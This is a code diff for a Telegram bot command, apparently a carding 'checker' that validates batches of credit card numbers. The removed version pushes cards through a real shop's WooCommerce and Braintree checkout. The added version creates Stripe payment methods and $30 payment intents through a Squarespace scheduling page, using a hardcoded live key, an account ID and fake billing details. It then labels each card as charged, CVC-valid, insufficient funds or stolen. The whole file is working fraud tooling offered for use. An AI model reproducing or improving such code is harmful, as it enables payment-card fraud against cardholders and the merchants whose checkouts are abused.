@@ -4,17 +4,17 @@ import json
 
 def process_nonsk2_command(bot, message):
     chat_id = message.chat.id
-    cards = message.text.split()[1:]
-    if cards:
-        total_cards = len(cards)
+    cc_data = message.text.split()[1:]  # Get the CC data from the command
+    if cc_data:
+        total_cards = len(cc_data)
         start_time = time.time()
         results = []
         initial_message = "↯ NONSK2 CHECKER\n\n"
         msg = bot.send_message(chat_id, initial_message + get_footer_info(total_cards, start_time, message.from_user.username))
 
-        for card in cards:
-            result = check_nonsk2(card)
-            results.append(f"Card: {card}\nResponse => {result}")
+        for cc in cc_data:
+            result = check_nonsk2_card(cc)
+            results.append(f"CC: {cc}\nResult => {result}")
             bot.edit_message_text(
                 chat_id=chat_id,
                 message_id=msg.message_id,
@@ -22,151 +22,115 @@ def process_nonsk2_command(bot, message):
             )
 
     else:
-        bot.send_message(chat_id, "Please provide card details in the format: /nonsk2 cc|mm|yy|cvc")
+        bot.send_message(chat_id, "Please provide CC details in the format: /nonsk2 cc|mon|year|cvv")
 
-def check_nonsk2(card):
+def check_nonsk2_card(cc):
     try:
-        retry = 0
-        while retry < 3:
-            # Replace these with your own proxy details or remove if not using proxies
-            hostname = "your_proxy_hostname"
-            port = "your_proxy_port"
-            username = "your_proxy_username"
-            password = "your_proxy_password"
+        cc_number, exp_month, exp_year, cvv = cc.split('|')
+    except ValueError:
+        return "Invalid CC format❌"
 
-            # Split the card details
-            cc, mm, yy, cvv = card.split("|")
+    session = requests.Session()
+    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
 
-            # Make initial requests to gather necessary data
-            Cookies = "cookies.txt"
-            r = requests.session()
-            response = r.get("https://reinrespects.com/product/respect-our-parks-dog-bandana-with-a-cause/")
-            if response.status_code != 200:
-                return f"Failed to access product page. Status code: {response.status_code}"
+    headers = {
+        "User-Agent": user_agent,
+        "Pragma": "no-cache",
+        "Accept": "*/*"
+    }
 
-            response = r.get("https://reinrespects.com/checkout/")
-            if response.status_code != 200:
-                return f"Failed to access checkout page. Status code: {response.status_code}"
+    # Step 1: Get PHPSESSID
+    session.get("https://app.squarespacescheduling.com/schedule.php?owner=21346949&calendarID=4717062", headers=headers)
+    phpsessid = session.cookies.get('PHPSESSID')
 
-            checkout_nonce = extract_string(response.text, 'id="woocommerce-process-checkout-nonce" value="', '"')
-            wcal_guest_capture_nonce = extract_string(response.text, 'id="wcal_guest_capture_nonce" value="', '"')
-            client_token_nonce = extract_string(response.text, '"client_token_nonce":"', '"')
+    # Step 2: Create Payment Method
+    payment_method_data = {
+        "type": "card",
+        "billing_details[name]": "Jame Mong",
+        "billing_details[email]": f"jamede{random_string()}@gmail.com",
+        "billing_details[address][postal_code]": "10080",
+        "card[number]": cc_number,
+        "card[exp_month]": exp_month,
+        "card[exp_year]": exp_year,
+        "guid": generate_guid(),
+        "muid": generate_guid(),
+        "sid": generate_guid(),
+        "pasted_fields": "number",
+        "payment_user_agent": "stripe.js/04dac047e0; stripe-js-v3/04dac047e0; card-element",
+        "time_on_page": "193418",
+        "key": "pk_live_Y1CqsAphMF6hE2OORZmZSBYl",
+        "_stripe_account": "acct_1Hr4hzAnMU46zgL6"
+    }
 
-            if not checkout_nonce or not wcal_guest_capture_nonce or not client_token_nonce:
-                return "Failed to retrieve necessary nonce values from the checkout page."
+    response = session.post("https://api.stripe.com/v1/payment_methods", data=payment_method_data, headers=headers)
+    response_data = response.json()
+    payment_method_id = response_data.get('id')
 
-            # Request for client token
-            data = {
-                "action": "wc_braintree_credit_card_get_client_token",
-                "nonce": client_token_nonce
-            }
-            headers = {
-                "Referer": "https://reinrespects.com/checkout/",
-                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
-            }
-            response = r.post("https://reinrespects.com/wp-admin/admin-ajax.php", data=data, headers=headers)
-            if response.status_code != 200:
-                return f"Failed to retrieve client token. Status code: {response.status_code}"
+    if not payment_method_id:
+        return "Failed to create payment method❌"
 
-            authorizationFingerprint = json.loads(base64.b64decode(extract_string(response.text, '{"success":true,"data":"', '"'))).get("authorizationFingerprint")
-            if not authorizationFingerprint:
-                return "Failed to retrieve authorization fingerprint."
+    # Step 3: Get Payment Intent
+    payment_intent_data = {
+        "amount": "30",
+        "clientDetails[name]": "Jame Mong",
+        "clientDetails[address_zip]": "10080",
+        "clientDetails[email]": f"jamede{random_string()}@gmail.com",
+        "description": "1112891149 - Jame Mong - Standard Studio A Rental - September 7, 2023 4:00pm",
+        "pm": payment_method_id
+    }
 
-            # Tokenize the credit card
-            data = {
-                "clientSdkMetadata": {
-                    "source": "client",
-                    "integration": "custom",
-                    "sessionId": "example-session-id"
-                },
-                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
-                "variables": {
-                    "input": {
-                        "creditCard": {
-                            "number": cc,
-                            "expirationMonth": mm,
-                            "expirationYear": yy,
-                            "cvv": cvv
-                        },
-                        "options": {
-                            "validate": False
-                        }
-                    }
-                },
-                "operationName": "TokenizeCreditCard"
-            }
-            headers = {
-                "Content-Type": "application/json",
-                "Authorization": f"Bearer {authorizationFingerprint}"
-            }
-            response = r.post("https://payments.braintree-api.com/graphql", json=data, headers=headers)
-            if response.status_code != 200:
-                return f"Failed to tokenize credit card. Status code: {response.status_code}"
+    response = session.post(f"https://app.squarespacescheduling.com/schedule.php?action=getIntent&owner=21204314&PHPSESSID={phpsessid}", data=payment_intent_data, headers=headers)
+    response_data = response.json()
+    payment_intent_id = response_data.get('intent')
+    client_secret = response_data.get('clientSecret')
 
-            token = json.loads(response.text).get("data", {}).get("tokenizeCreditCard", {}).get("token")
-            if not token:
-                return "Failed to retrieve token."
+    if not payment_intent_id or not client_secret:
+        return "Failed to get payment intent❌"
 
-            # Complete the purchase
-            data = {
-                "billing_first_name": "John",
-                "billing_last_name": "Doe",
-                "billing_country": "US",
-                "billing_address_1": "123 Main St",
-                "billing_city": "Anytown",
-                "billing_state": "CA",
-                "billing_postcode": "12345",
-                "billing_phone": "5555555555",
-                "billing_email": "john.doe@example.com",
-                "wcal_guest_capture_nonce": wcal_guest_capture_nonce,
-                "payment_method": "braintree_credit_card",
-                "wc_braintree_credit_card_card_type": "visa",
-                "wc_braintree_credit_card_3d_secure_order_total": "8.95",
-                "wc_braintree_credit_card_payment_nonce": token,
-                "terms": "on",
-                "terms-field": 1,
-                "woocommerce-process-checkout-nonce": checkout_nonce
-            }
-            headers = {
-                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
-            }
-            response = r.post("https://reinrespects.com/?wc-ajax=checkout", data=data, headers=headers)
-            if response.status_code != 200:
-                return f"Failed to complete the purchase. Status code: {response.status_code}"
+    # Step 4: Confirm Payment Intent
+    confirm_payment_data = {
+        "payment_method": payment_method_id,
+        "expected_payment_method_type": "card",
+        "use_stripe_sdk": "true",
+        "key": "pk_live_Y1CqsAphMF6hE2OORZmZSBYl",
+        "_stripe_account": "acct_1Hr4hzAnMU46zgL6",
+        "client_secret": client_secret
+    }
 
-            response_data = json.loads(response.text)
+    response = session.post(f"https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm", data=confirm_payment_data, headers=headers)
+    response_data = response.json()
 
-            if "order-received" in response.text:
-                receipturl = response_data.get("redirect", "").replace("\\", "")
-                return f"CHARGED {card} <a href='{receipturl}' target='_blank'>Receipt</a>"
+    if "succeeded" in response_data.get("status", ""):
+        return "30$✅ CCN"
+    elif "incorrect_cvc" in response_data.get("error", {}).get("decline_code", ""):
+        return "CCN"
+    elif "insufficient_funds" in response_data.get("error", {}).get("decline_code", ""):
+        return "NSF"
+    elif "stolen_card" in response_data.get("error", {}).get("decline_code", ""):
+        return "STOLEN"
+    elif "three_d_secure_redirect" in response_data.get("error", {}).get("decline_code", ""):
+        return "3DSECURE"
+    elif "rate_limit" in response_data.get("error", {}).get("decline_code", ""):
+        return "RATE LIMIT"
+    else:
+        return "Declined"
 
-            elif "The card verification number does not match" in response.text:
-                return f"VALIDATED {card} The card verification number does not match"
+def random_string():
+    import random
+    import string
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
 
-            elif "The provided address does not match" in response.text:
-                return f"VALIDATED {card} The provided address does not match"
-
-            elif response_data.get("messages"):
-                return f"DECLINED {card} {response_data.get('messages')}"
-
-            return f"DECLINED {card} {json.dumps(response_data)}"
-
-    except Exception as e:
-        return f"An error occurred: {str(e)}"
-
-def extract_string(content, start, end):
-    try:
-        return content.split(start)[1].split(end)[0]
-    except IndexError:
-        return None
+def generate_guid():
+    import uuid
+    return str(uuid.uuid4())
 
 def get_footer_info(total_cards, start_time, username):
     elapsed_time = time.time() - start_time
     footer = (
         f"－－－－－－－－－－－－－－－－\n"
-        f"🔹 Total Cards Checked - {total_cards}\n"
-        f"⏱️ Time Taken - {elapsed_time:.2f} seconds\n"
-        f"▫️ Checked by: {username}\n"
+        f"⌧ Total CARD Checked - {total_cards}\n"
+        f"⌧ Time Taken - {elapsed_time:.2f} seconds\n"
+        f"⌧ Checked by: {username}\n"
         f"⚡️ Bot by - AFTAB [BOSS]\n"
         f"－－－－－－－－－－－－－－－－"
     )
